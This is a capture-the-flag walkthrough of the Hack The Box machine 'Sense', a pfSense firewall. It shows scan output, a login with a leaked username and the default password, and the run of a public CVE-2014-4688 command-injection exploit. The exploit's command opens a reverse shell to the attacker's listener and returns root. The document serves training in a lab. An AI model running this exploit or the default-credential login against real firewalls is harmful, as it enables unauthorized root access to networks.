# Sense

## Information Gathering
Sense<br>
10.10.10.60<br>

Software Versions
- lighttpd 1.4.35
- pfsense 2.1.3-RELEASE
- FreeBSD 8.3-RELEASE-p16

## Enumeration
Of course, start with an nmap scan.
```bash
# Nmap 7.92 scan initiated Sun Feb 20 22:47:37 2022 as: nmap -p- -A -oN nmap/sense.nmap -Pn 10.10.10.60
Nmap scan report for 10.10.10.60
Host is up (0.028s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
|_ssl-date: TLS randomness does not represent time
|_http-server-header: lighttpd/1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-title: Login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): Comau embedded (92%), FreeBSD 8.X (85%), OpenBSD 4.X (85%)
OS CPE: cpe:/o:freebsd:freebsd:8.1 cpe:/o:openbsd:openbsd:4.3
Aggressive OS guesses: Comau C4G robot control unit (92%), FreeBSD 8.1 (85%), OpenBSD 4.3 (85%), OpenBSD 4.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   27.72 ms 10.10.14.1
2   27.73 ms 10.10.10.60

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 20 22:50:14 2022 -- 1 IP address (1 host up) scanned in 157.11 seconds

```
Taking a look at the HTTP server automatically redirects you to the HTTPS server. I'll start with a Nikto scan:
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.60
+ Target Port: 443
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ GET The site uses SSL and Expect-CT header is not present.
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Cookie cookie_test created without the secure flag
+ GET Cookie cookie_test created without the httponly flag
+ GET Multiple index files found: /index.php, /index.html
+ GET Hostname '10.10.10.60' does not match certificates names: Common
+ OPTIONS Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 

```
And a Gobuster scan
```bash
/index.html           (Status: 200) [Size: 329]
/help.php             (Status: 200) [Size: 6689]
/index.php            (Status: 200) [Size: 6690]
/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
/stats.php            (Status: 200) [Size: 6690]
/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]
/edit.php             (Status: 200) [Size: 6689]
/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
/system.php           (Status: 200) [Size: 6691]
/license.php          (Status: 200) [Size: 6692]
/status.php           (Status: 200) [Size: 6691]
/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
/changelog.txt        (Status: 200) [Size: 271]
/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]
/exec.php             (Status: 200) [Size: 6689]
/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]
/graph.php            (Status: 200) [Size: 6690]
/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]
/wizard.php           (Status: 200) [Size: 6691]
/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/]
/pkg.php              (Status: 200) [Size: 6688]
/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/]
/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]
/xmlrpc.php           (Status: 200) [Size: 384]
/reboot.php           (Status: 200) [Size: 6691]
/interfaces.php       (Status: 200) [Size: 6695]
/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]
/system-users.txt     (Status: 200) [Size: 106]
/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]

```

## Exploitation
Looking at the Gobuster results, there is a file called "system-users.txt". Inside this file leaks a user and tells us that the password is the default password for the company. Doing a bit of Googling reveals that the default password for pfsense is "pfsense". <b>rohit:pfsense</b> authenticates us. Once we are logged in, a bunch of system info is given to us including the version of pfsense and the version of FreeBSD being used.<br> 
A CVE is associate with this webapp: CVE-2014-4688. There is also this PoC: https://www.exploit-db.com/exploits/43560. Running this script gives a root shell. Don't forget to start your netcat listener.
```bash
/command_injection.py --rhost 10.10.10.60:443 --lhost 10.10.14.122 --lport 1337 --username rohit --password pfsense

# id
uid=0(root) gid=0(wheel) groups=0(wheel)
```